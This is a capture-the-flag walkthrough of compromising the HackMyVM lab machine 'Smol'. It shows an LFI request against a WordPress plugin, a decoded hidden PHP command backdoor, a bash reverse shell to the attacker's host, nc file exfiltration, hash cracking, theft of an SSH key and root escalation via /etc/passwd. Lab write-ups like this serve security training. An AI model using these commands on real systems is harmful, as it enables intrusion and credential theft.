---
title: CTF Walkthrough for HackMyVM Machine Smol
date: 2024-10-27 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, CVE, WordPress, LFI]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/box-smol.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Smol a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Zero<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Smol](https://downloads.hackmyvm.eu/smol.zip)<br>
### Tools used
1) Nmap<br>
2) Wpscan<br>
3) Hashcat<br>
4) John The Ripper<br>
   
## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Scans/Service]
└─$ nmap -sn -n 10.0.2.16/24                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 21:19 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00027s latency).
Nmap scan report for 10.0.2.38
Host is up (0.00057s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.02 seconds
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Scans/Service]
└─$ nmap -Pn -n -sC -sV 10.0.2.38 -oN service-scan.nmap  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 21:20 BST
Nmap scan report for 10.0.2.38
Host is up (0.0048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
```

We can see the domain name of the web application in Nmap's scan. Let's add this to our `/etc/hosts` file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Scans/Service]
└─$ echo "10.0.2.38\tsmol.hmv  www.smol.hmv" | sudo tee -a /etc/hosts      
10.0.2.38       smol.hmv  www.smol.hmv
```

The target runs an SSH and a web server. Let's visit the web application running on port 80. 
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/1-browse.png)

The footer of the home page tells us that this web application uses the WordPress CMS. Let's use `wpscan` to enumerate this WordPress instance.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Scan/Web]
└─$ wpscan --url http://www.smol.hmv/  
<SNIP>
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
<SNIP>
```

Notice the presence of the `jsmol2wp` plugin. We can Google this plugin with its version number to check if it has any public vulnerability.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/exploit.png)

Notice that this plugin is vulnerable to an LFI vulnerability. [This](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) goes into more detail on how to exploit this vulnerability. Let's read the database password in the `wp-config.php` file.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]                                                                                                                                     
└─$ curl -s 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'                    
<?php
<SNIP>                     
/** The name of the database for WordPress */  
define( 'DB_NAME', 'wordpress' );

/** Database username */                                                                      
define( 'DB_USER', 'wpuser' );              
/** Database password */                                                                      
define( 'DB_PASSWORD', '<REDACTED>' );                                          
<SNIP>  
```

Now that we have a pair of login credentials, we can try to log into the WordPress instance.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/login.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/after-login.png)

We see that the `wpuser` is a valid user in the WordPress instance and uses the same password. Unfortunately, this doesn't look like a user with high privileges so let's continue our enumeration. We can fuzz the WordPress instance for installed plugins using the LFI vulnerability.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ ffuf -ic -c -u 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  -fs 2
<SNIP>

wp-content/plugins/hello.php [Status: 200, Size: 2704, Words: 321, Lines: 104, Duration: 224ms]
:: Progress: [13370/13370] :: Job [1/1] :: 82 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We can see that the Hello Dolly plugin is installed let's read this file.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ curl -s 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php' 
<SNIP>
// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
        eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
        
        $chosen = hello_dolly_get_lyric();
        $lang   = '';
        if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
                $lang = ' lang="en"';
        }
<SNIP>
```

Notice the use of the `eval()` function on a decoded base64 string. This function executes valid PHP code so let's decode the string to see what is executed.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ echo -n CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA= | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }

┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Misc File]
└─$ printf "\143\155\x64"
cmd  
```

The system command executes the content of the `cmd` GET parameter. This is a backdoor in the WordPress instance and we can use it to obtain a foothold. Let's create a bash reverse shell script and host it on a Python server.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ echo 'bash -c "/bin/bash -i >& /dev/tcp/10.0.2.16/1234 0>&1"' > rev.sh

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ python3 -m http.server 80                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now let's start our listener that will receive the shell.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

With all this set, we can now download the shell on the target and execute it to obtain a foothold.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/shell-1.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/shell-2.png)

When we return to our listener, we will notice a reverse connection from the target.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.38] 41594
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smol:/var/www/wordpress/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@smol:/var/www/wordpress/wp-admin$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@smol:/var/www/wordpress/wp-admin$ 
```

Remember that we obtained the database credentials of the WordPress instance so let's enumerate the password hashes of all the users in this instance.
```bash
www-data@smol:/$ mysql -u wpuser -p
Enter password:              
Welcome to the MySQL monitor.  Commands end with ; or \g.
<SNIP>                   

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;       
+--------------------+       
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+                                                                        
5 rows in set (0.00 sec)
mysql> use wordpress
Reading table information for completion of table and column names                            
You can turn off this feature to get a quicker startup with -A   
mysql> SELECT user_login,user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B5TxxxxxxxxxxxxxxxxxxxqsQACvOJ0 |
| wpuser     | $P$BfZxxxxxxxxxxxxxxxxxxxBVh2Z1/E. |
| think      | $P$B0jxxxxxxxxxxxxxxxxxxxVi2pb7Vd/ |
| gege       | $P$BsIxxxxxxxxxxxxxxxxxxxM4FwiG0m1 |
| diego      | $P$BWFxxxxxxxxxxxxxxxxxxxrff4JPwv1 |
| xavi       | $P$Bvxxxxxxxxxxxxxxxxxxxx40mqJZCN/ |
+------------+------------------------------------+
6 rows in set (0.00 sec)
```

We can copy these hashes and attempt offline password cracking.
```bash
┌──(christ㉿Christ-PC)-[~/Documents]
└─$ hashcat -a 0 -m 400 hashes .rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>

┌──(christ㉿Christ-PC)-[~/Documents]
└─$ hashcat -a 0 -m 400 hashes --show
$P$BWFxxxxxxxxxxxxxxxxxxxrff4JPwv1:<REDACTED>
```

We cracked the password of the Diego user who is also a local user on the target. Let's switch to this user using this password.
```bash
www-data@smol:/$ su diego
Password: 
diego@smol:/$ cd /home/diego
diego@smol:~$ ls -l
total 4
-rw-r--r-- 1 root root 33 Aug 16  2023 user.txt
```

A quick enumeration of the file system reveals that the home directories of all users belong to a custom group called `internal`.
```bash
diego@smol:/home$ ls -l
total 16
drwxr-x--- 4 diego internal 4096 Oct 27 08:59 diego
drwxr-x--- 2 gege  internal 4096 Aug 18  2023 gege
drwxr-x--- 5 think internal 4096 Jan 12  2024 think
drwxr-x--- 2 xavi  internal 4096 Aug 18  2023 xavi
diego@smol:/home$ id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```

We can enumerate this directories.
```bash
diego@smol:/home$ ls -la xavi/ think/ gege/
gege/:
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip

think/:
total 36
drwxr-x--- 5 think internal 4096 Oct 27 09:15 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw------- 1 think think      28 Oct 27 09:15 .lesshst
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null

xavi/:
total 20
drwxr-x--- 2 xavi internal 4096 Aug 18  2023 .
drwxr-xr-x 6 root root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root        9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 xavi xavi      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 xavi xavi     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 xavi xavi      807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root        9 Aug 18  2023 .viminfo -> /dev/null
```

Think's home directory has the `.ssh` folder and we have read access to it. Let's read Think's SSH private key and use it to log in as Think.
```bash
diego@smol:/home$ cat think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
81DXo7MfGm0bSFAAAAEnRoaW5rQHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ nano think_rsa 

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ chmod 600 think_rsa         

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ ssh think@10.0.2.38 -i think_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
<SNIP>
think@smol:~$ 
```

We can also enumerate group membership on the target.
```bash
think@smol:/home$ cat /etc/group | grep "gege\|diego\|think\|xavi"
think:x:1000:
xavi:x:1001:
diego:x:1002:
gege:x:1003:
dev:x:1004:think,gege
internal:x:1005:diego,gege,think,xavi
```

We can see that all local users are members of the custom `internal` group and both Think and Gege are members of the `dev` which is also a custom group. Since many local users are on the target, we can read the PAM configuration files used to configure methods to authenticate users.
```bash
think@smol:/home$ cat /etc/pam.d/su
#                                      
# The PAM configuration file for the Shadow `su' service      
#
                                               
# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege          
auth  sufficient                 pam_succeed_if.so use_uid user = think
<SNIP>ex
```

We can see from here that the user Think can switch to Gege without a password. Let's switch to Gege.
```bash
think@smol:/home$ su - gege
gege@smol:~$ ls -l
total 31512
-rwxr-x--- 1 root gege 32266546 Aug 16  2023 wordpress.old.zip
```

Notice  that Gege's home directory contains a backup file zip named `wordpress.old.zip`. This is surely a backup of the WordPress directory. Unfortunately, this file is protected by a password we don't know. 
```bash
gege@smol:~$ unzip wordpress.old.zip 
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password: 
<SNIP>
```

We can transfer this file to our attack host and use John to extract the hash of the password used to protect this file and attempt offline cracking.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ nc -lvnp 8000 > wordpress.zip                        
listening on [any] 8000 ...
```

```bash
gege@smol:~$ nc -q 0 10.0.2.16 8000 < wordpress.old.zip 
```

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ zip2john wordpress.zip  > zip-hash
<SNIP>
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<REDACTED> (wordpress.zip)     
1g 0:00:00:00 DONE (2024-10-27 12:36) 1.250g/s 9543Kp/s 9543Kc/s 9543KC/s hesse..hellome2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We successfully cracked the password of the zip file. Let's uncompress it and enumerate it for any interesting information.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ unzip wordpress.zip
Archive:  wordpress.zip
   creating: wordpress.old/
[wordpress.zip] wordpress.old/wp-config.php password:
  inflating: wordpress.old/wp-config.php
  inflating: wordpress.old/index.php  
  <SNIP>
  
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Smol/Misc File]
└─$ cd wordpress.old 
┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Misc File/wordpress.old]
└─$ ls
index.php    readme.html      wp-admin            wp-comments-post.php  wp-content   wp-includes        wp-load.php   wp-mail.php      wp-signup.php     xmlrpc.php
license.txt  wp-activate.php  wp-blog-header.php  wp-config.php         wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
```

Notice that it is exactly like a WordPress root's directory. Since this is an old backup, let's enumerate the database credentials to see if there was any change with time.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Smol/Misc File/wordpress.old]
└─$ cat wp-config.php| grep -i "pass\|user"
/** Database username */
define( 'DB_USER', 'xavi' );
/** Database password */
define( 'DB_PASSWORD', '<REDACTED>' );
 * This will force all users to have to log in again.
```

We can see the database credentials of the user Xavi. Xavi is also a local user so let's use these credentials to log in as Xavi.
```bash
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$
```

We can log in as Xavi. A quick look at this user's sudo right reveals that Xavi can run the Vim text editor as root to edit the `/etc/passwd` file
```bash
xavi@smol:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) /usr/bin/vi /etc/passwd
```

We can edit this file by removing the `x` in the root's entry to enable open authentication to this account.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-27-smol/edit-passwd.png)

After the modification, we can log in as root without the use of a password and read the second flag.
```bash
xavi@smol:/home/gege$ su root
root@smol:/home/gege$ ls /root
total 64K
drwx------  7 root root 4.0K Oct 27 09:41 .
drwxr-xr-x 18 root root 4.0K Mar 29  2024 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
drwx------  2 root root 4.0K Jun  2  2023 .cache
-rw-------  1 root root   35 Mar 29  2024 .lesshst
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Aug 16  2023 root.txt
-rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
drwx------  3 root root 4.0K Jun 21  2023 snap
drwx------  2 root root 4.0K Jun  2  2023 .ssh
-rw-rw-rw-  1 root root  13K Oct 27 09:41 .viminfo
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an LFI vulnerability in a WordPress plugin to read the credentials of a valid user. Next, you leverage a backdoor present on the target to obtain a foothold. Finally, you obtained root access by leveraging misconfigurations and weak passwords used on the system. This machine was designed to show how improper upgrade practices, password reuse, and the use of weak passwords could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
